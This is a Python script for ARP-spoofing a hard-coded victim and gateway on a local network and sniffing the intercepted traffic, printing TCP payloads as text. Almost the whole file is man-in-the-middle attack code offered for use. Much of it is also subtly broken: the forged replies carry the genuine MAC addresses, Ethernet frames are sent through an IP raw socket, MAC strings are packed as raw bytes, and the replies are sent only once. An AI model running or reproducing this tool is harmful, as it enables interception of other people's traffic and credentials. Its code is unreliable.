import socket
import struct
import threading
import platform
from scapy.all import ARP, Ether, srp, send, sniff

class ARP_Spoofing:
    def __init__(self):
        self.stop_sniffing_flag = threading.Event()

    def get_interface(self):
        system = platform.system()
        if system == "Windows":
            # On Windows, use the default interface
            return socket.gethostbyname(socket.gethostname())
        elif system == "Linux":
            # On Linux, specify the interface name (e.g., "enp0s8")
            return "enp0s8"  # Change this to your desired interface
        else:
            raise Exception("Unsupported operating system")

    def send_arp_reply(self, interface, source_ip, source_mac, target_ip, target_mac):
        # Create a raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        if platform.system() == "Linux":
            # On Linux, binding to a specific interface is required
            s.bind((interface, 0))

        # Craft the ARP reply packet
        ethernet_header = struct.pack("!6s6sH", target_mac, source_mac, 0x0806)
        arp_header = struct.pack("!HHBBH6s4s6s4s",
                                 0x0001, 0x0800, 6, 4,
                                 2, source_mac,
                                 socket.inet_aton(source_ip),
                                 target_mac,
                                 socket.inet_aton(target_ip))

        # Concatenate the headers to form the complete ARP reply packet
        packet = ethernet_header + arp_header

        # Send the packet
        s.send(packet)

    def sniff_tcp_packets(self, interface):
        # Create a raw socket
        if platform.system() == "Windows":
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        elif platform.system() == "Linux":
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))  # 0x0003 is ETH_P_ALL
        else:
            raise Exception("Unsupported operating system")
        
        # Bind the socket to the specified network interface
        s.bind((interface, 0))

        while not self.stop_sniffing_flag.is_set():
            # Receive packets
            packet = s.recvfrom(65565)
            
            # Extract the packet data
            packet_data = packet[0]
            
            # Extract the Ethernet header
            eth_length = 14
            eth_header = packet_data[:eth_length]
            eth_header = struct.unpack("!6s6sH", eth_header)
            
            # IP header starts after the Ethernet header
            ip_header = packet_data[eth_length:]
            
            # Extract the protocol
            protocol = ip_header[9]
            
            # Check if it's a TCP packet (protocol number 6)
            if protocol == 6:
                # Extract the TCP payload
                tcp_header = ip_header[20:]
                tcp_payload = tcp_header[32:]
                
                # Check if it has payload
                if tcp_payload and len(tcp_payload) > 0:
                    try:
                        # Decode the TCP payload as UTF-8
                        decoded_payload = tcp_payload.decode('utf-8')
                        print(decoded_payload)
                    except UnicodeDecodeError:
                        continue

    def start_arp_spoofing(self, victim_ip, gateway_ip):
        interface = self.get_interface()

        # Retrieve MAC addresses
        victim_mac = self.get_mac_address(victim_ip)
        gateway_mac = self.get_mac_address(gateway_ip)

        # Start ARP spoofing threads
        arp_spoof_victim = threading.Thread(target=self.send_arp_reply, args=(interface, gateway_ip, gateway_mac, victim_ip, victim_mac))
        arp_spoof_gateway = threading.Thread(target=self.send_arp_reply, args=(interface, victim_ip, victim_mac, gateway_ip, gateway_mac))

        arp_spoof_victim.start()
        arp_spoof_gateway.start()

    def stop_sniffing(self):
        self.stop_sniffing_flag.set()

    def get_mac_address(self, ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

if __name__ == "__main__":
    arp_spoofing = ARP_Spoofing()
    arp_spoofing.start_arp_spoofing("10.134.254.56", "10.134.253.72")
    arp_spoofing.sniff_tcp_packets(arp_spoofing.get_interface())
